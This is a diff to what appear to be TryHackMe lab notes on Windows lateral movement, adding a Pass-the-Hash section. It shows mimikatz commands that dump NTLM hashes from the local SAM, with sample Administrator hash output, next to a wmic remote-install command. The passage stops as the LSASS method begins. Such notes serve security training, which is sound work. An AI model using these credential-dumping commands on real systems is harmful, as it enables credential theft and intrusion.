@@ -184,3 +184,22 @@ wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Wind
 ![ntlm](https://github.com/nkn-ctrl/TryHackMe/assets/73976100/7a3d4ba8-6638-4241-899f-7996289fded1)
 
 #### Pass-the-Hash
+If the Windows domain is configured to use NTLM authentication, we can Pass-the-Hash (PtH) and authenticate successfully.  
+To extract NTLM hashes, we can either use mimikatz to read the ***local SAM*** or extract hashes directly from ***LSASS memory***.  
+
+- Extracting NTLM hashes from local SAM:  
+    This method will only allow you to get hashes from local users on the machine. No domain user's hashes will be available.
+```
+C:\> C:\tools\mimikatz.exe
+
+mimikatz # privilege::debug
+mimikatz # token::elevate
+
+mimikatz # lsadump::sam   
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 145e02c50333951f71d13c245d352b50
+```
+
+- Extracting NTLM hashes from LSASS memory:  
+    This method will let you extract any NTLM hashes for local users and any domain user that has recently logged onto the machine.
